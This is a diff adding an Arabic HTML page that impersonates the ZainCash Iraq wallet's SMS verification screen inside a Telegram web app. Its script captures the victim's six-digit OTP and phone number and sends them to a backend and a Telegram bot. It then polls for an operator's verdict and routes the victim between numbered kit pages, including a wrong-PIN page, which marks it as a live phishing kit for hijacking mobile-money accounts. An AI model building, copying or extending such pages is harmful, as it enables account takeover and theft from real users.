@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>رمز التحقق - زين كاش العراق</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --zc-purple: #6A1B9A;          /* ZainCash Signature Deep Purple */
+            --zc-magenta: #C2185B;         /* ZainCash Vibrant Magenta Accent */
+            --zc-gradient: linear-gradient(135deg, #4A148C 0%, #8E24AA 55%, #D81B60 100%);
+            --zc-dark: #1E102B;            /* Deep Plum Dark Text */
+            --bg-color: #F7F5F9;
+            --card-bg: #FFFFFF;
+            --text-dark: #1E102B;
+            --text-muted: #6A5D75;
+            --border-color: #E0D7E8;
+            --input-bg: #F5EEF8;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Cairo', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            direction: rtl;
+        }
+
+        /* Top Header Area */
+        .app-header {
+            width: 100%;
+            background-color: transparent;
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .back-btn-top {
+            color: var(--text-dark);
+            text-decoration: none;
+            font-size: 22px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .header-title {
+            font-size: 20px;
+            font-weight: 900;
+            color: var(--text-dark);
+        }
+
+        /* Main Container */
+        .container {
+            width: 100%;
+            max-width: 440px;
+            margin: 10px auto 0;
+            padding: 0 24px 30px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+            text-align: right;
+        }
+
+        .instruction-text {
+            font-size: 14.5px;
+            color: var(--text-muted);
+            margin: 10px 0 25px;
+            line-height: 1.6;
+            font-weight: 600;
+        }
+
+        /* 🚨 Red Status Error Banner */
+        .error-banner {
+            width: 100%;
+            background-color: #ffebe9;
+            border: 1px solid #ff4d4f;
+            color: #d93025;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: none;
+            text-align: center;
+            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
+        }
+
+        /* Responsive & Interactive 6 OTP Input Box Group */
+        .otp-input-group {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 25px;
+            width: 100%;
+            cursor: pointer;
+            direction: ltr; /* Keeps OTP LTR for numbers */
+        }
+
+        .otp-box {
+            flex: 1;
+            min-width: 0;
+            height: 52px;
+            background-color: var(--input-bg);
+            border: 1.5px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 22px;
+            font-weight: 800;
+            text-align: center;
+            outline: none;
+            color: var(--text-dark);
+            transition: border-color 0.2s, background-color 0.2s;
+        }
+
+        .otp-box:focus {
+            border-color: var(--zc-magenta);
+            background-color: #ffffff;
+        }
+
+        .otp-box.input-error {
+            border-color: #d93025;
+            background-color: #fff9f9;
+        }
+
+        /* Timer Box Section */
+        .timer-card {
+            background-color: #F5EEF8;
+            border-radius: 12px;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            width: 100%;
+            border: 1px solid #E1BEE7;
+        }
+
+        .resend-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .resend-text {
+            font-size: 14.5px;
+            color: var(--text-dark);
+            font-weight: 700;
+        }
+
+        .timer-countdown {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--zc-purple);
+        }
+
+        .resend-action-btn {
+            color: var(--zc-purple);
+            font-weight: 800;
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 14.5px;
+            display: none;
+        }
+
+        /* Buttons Section */
+        .btn-confirm {
+            background: var(--zc-gradient);
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: opacity 0.2s, transform 0.1s;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 14px rgba(142, 36, 170, 0.35);
+        }
+
+        .btn-confirm:active {
+            opacity: 0.92;
+            transform: scale(0.99);
+        }
+
+        .btn-cancel {
+            background-color: transparent;
+            color: var(--zc-purple);
+            border: none;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            text-align: center;
+            width: 100%;
+            text-decoration: underline;
+        }
+
+        /* 📱 Full Screen Overlay Status Page */
+        .overlay-status {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: var(--zc-dark);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 24px;
+            box-sizing: border-box;
+        }
+
+        .overlay-status.active {
+            display: flex;
+        }
+
+        .overlay-spinner-circle {
+            width: 90px;
+            height: 90px;
+            background: var(--zc-gradient);
+            border-radius: 50%;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 6px 20px rgba(142, 36, 170, 0.35);
+        }
+
+        .overlay-spinner-circle::after {
+            content: '';
+            width: 66px;
+            height: 66px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid var(--zc-dark);
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 800;
+            margin: 0 0 12px;
+        }
+
+        .overlay-subtext {
+            color: #D1C4E9;
+            font-size: 14.5px;
+            margin: 0;
+            line-height: 1.6;
+            font-weight: 600;
+            max-width: 300px;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Navigation Bar -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">←</a>
+    <div class="header-title">رمز التحقق (OTP)</div>
+</div>
+
+<div class="container">
+    <p class="instruction-text">
+        أدخل رمز التحقق المكون من 6 أرقام المرسل عبر رسالة نصية إلى رقم المحفظة الخاص بك.
+    </p>
+
+    <!-- Red Error Banner for Wrong Code -->
+    <div id="statusErrorContainer" class="error-banner"></div>
+
+    <form id="otpForm" onsubmit="submitOtp(event)">
+        <!-- 6 Box Interactive PIN Group -->
+        <div class="otp-input-group" id="otpGroup">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+        </div>
+
+        <!-- Timer Box -->
+        <div class="timer-card">
+            <div class="resend-wrapper">
+                <span class="resend-text">إعادة إرسال الرمز</span>
+            </div>
+            <div id="timerCountdown" class="timer-countdown">01:00</div>
+            <div id="resendBtn" class="resend-action-btn" onclick="resendCode()">إعادة الإرسال</div>
+        </div>
+
+        <button type="submit" id="verifyBtn" class="btn-confirm">تأكيد الرمز</button>
+        <button type="button" class="btn-cancel" onclick="goBack()">إلغاء</button>
+    </form>
+</div>
+
+<!-- Status Overlay -->
+<div id="statusOverlay" class="overlay-status">
+    <div class="overlay-spinner-circle"></div>
+    <h2 class="overlay-title" id="overlayMainText">يرجى الانتظار...</h2>
+    <p class="overlay-subtext" id="overlaySubText">جاري التحقق من رمز الرسالة النصية...</p>
+</div>
+
+<script>
+    const TOTAL_TIME = 60; // 1 Minute Countdown
+    let timeLeft = TOTAL_TIME;
+    let timerInterval = null;
+    let statusPollingInterval = null;
+
+    const timerCountdownEl = document.getElementById('timerCountdown');
+    const resendBtnEl = document.getElementById('resendBtn');
+    const statusErrorContainer = document.getElementById('statusErrorContainer');
+    const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
+    const otpGroup = document.getElementById('otpGroup');
+
+    // Overlay Elements
+    const statusOverlay = document.getElementById('statusOverlay');
+    const overlayMainText = document.getElementById('overlayMainText');
+    const overlaySubText = document.getElementById('overlaySubText');
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        setupOtpInputLogic();
+        startTimer();
+    };
+
+    function setupOtpInputLogic() {
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                const val = box.value.replace(/\D/g, '');
+                box.value = val;
+
+                // Clear red error highlighting
+                otpBoxes.forEach(b => b.classList.remove('input-error'));
+                statusErrorContainer.style.display = 'none';
+
+                if (val && index < otpBoxes.length - 1) {
+                    otpBoxes[index + 1].focus();
+                }
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === "Backspace") {
+                    if (!box.value && index > 0) {
+                        otpBoxes[index - 1].focus();
+                    }
+                }
+            });
+
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pastedData = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                
+                if (pastedData) {
+                    const digits = pastedData.split('').slice(0, 6);
+                    digits.forEach((digit, idx) => {
+                        if (otpBoxes[idx]) {
+                            otpBoxes[idx].value = digit;
+                        }
+                    });
+                    const nextIndex = Math.min(digits.length, 5);
+                    otpBoxes[nextIndex].focus();
+                }
+            });
+        });
+
+        // Click anywhere on group to focus current active empty field
+        otpGroup.addEventListener('click', () => {
+            const emptyBox = otpBoxes.find(b => !b.value) || otpBoxes[otpBoxes.length - 1];
+            emptyBox.focus();
+        });
+
+        // Auto-focus first input box
+        setTimeout(() => {
+            if (otpBoxes[0]) otpBoxes[0].focus();
+        }, 300);
+    }
+
+    function startTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        
+        timeLeft = TOTAL_TIME;
+        updateTimerDisplay();
+
+        resendBtnEl.style.display = 'none';
+        timerCountdownEl.style.display = 'block';
+
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            updateTimerDisplay();
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                onTimerExpired();
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        
+        const formattedMinutes = String(minutes).padStart(2, '0');
+        const formattedSeconds = String(seconds).padStart(2, '0');
+        
+        timerCountdownEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
+    }
+
+    function onTimerExpired() {
+        timerCountdownEl.style.display = 'none';
+        resendBtnEl.style.display = 'block';
+    }
+
+    async function resendCode() {
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+        try {
+            await fetch("/api/resend-otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, step: "First OTP (Page 8)" })
+            });
+        } catch (err) {
+            console.error("Resend error:", err);
+        }
+        alert("تم إرسال رمز تحقق جديد عبر رسالة نصية.");
+        startTimer();
+    }
+
+    async function submitOtp(event) {
+        event.preventDefault();
+
+        let codeVal = "";
+        otpBoxes.forEach(b => codeVal += b.value);
+
+        if (codeVal.length < 6) {
+            statusErrorContainer.style.display = 'block';
+            statusErrorContainer.textContent = "الرمز غير مكتمل. يرجى إدخال الرمز المكون من 6 أرقام كاملاً.";
+            otpBoxes.forEach(b => b.classList.add('input-error'));
+            return;
+        }
+
+        // Clear error display
+        statusErrorContainer.style.display = 'none';
+        otpBoxes.forEach(b => b.classList.remove('input-error'));
+
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+
+        // Display waiting screen
+        overlayMainText.textContent = "يرجى الانتظار...";
+        overlaySubText.textContent = "جاري التحقق من رمز الرسالة النصية...";
+        statusOverlay.classList.add('active');
+
+        // Save local OTP
+        localStorage.setItem('smsOtp1', codeVal);
+
+        // Send payload to backend
+        try {
+            await fetch("/api/otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ event: "otp_verification_1", phone, otp: codeVal })
+            });
+        } catch (err) {
+            console.error("❌ Notification error:", err);
+        }
+
+        const tg = window.Telegram?.WebApp;
+        if (tg && tg.sendData) {
+            tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
+        }
+
+        // Poll backend for bot approval or error status
+        startStatusPolling(phone);
+    }
+
+    function startStatusPolling(phone) {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+
+        statusPollingInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await response.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(statusPollingInterval);
+                    overlayMainText.textContent = "تم تأكيد الرمز!";
+                    overlaySubText.textContent = "جاري التحويل...";
+
+                    setTimeout(() => {
+                        window.location.href = "/page9";
+                    }, 1200);
+                } 
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Show Red Error Message
+                    statusErrorContainer.style.display = 'block';
+                    statusErrorContainer.textContent = "الرمز غير صحيح. يرجى إدخال الرمز الصحيح.";
+                    otpBoxes.forEach(b => {
+                        b.classList.add('input-error');
+                        b.value = "";
+                    });
+                    if (otpBoxes[0]) otpBoxes[0].focus();
+                }
+                else if (data.status === "otp2_wrongpin") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Redirect to Page 6 with error flag
+                    window.location.href = "/page6?error=wrong_pin";
+                }
+            } catch (err) {
+                console.error("Status polling error:", err);
+            }
+        }, 2000);
+    }
+
+    function goBack() {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+        window.location.href = "/page6";
+    }
+</script>
+
+</body>
+</html>
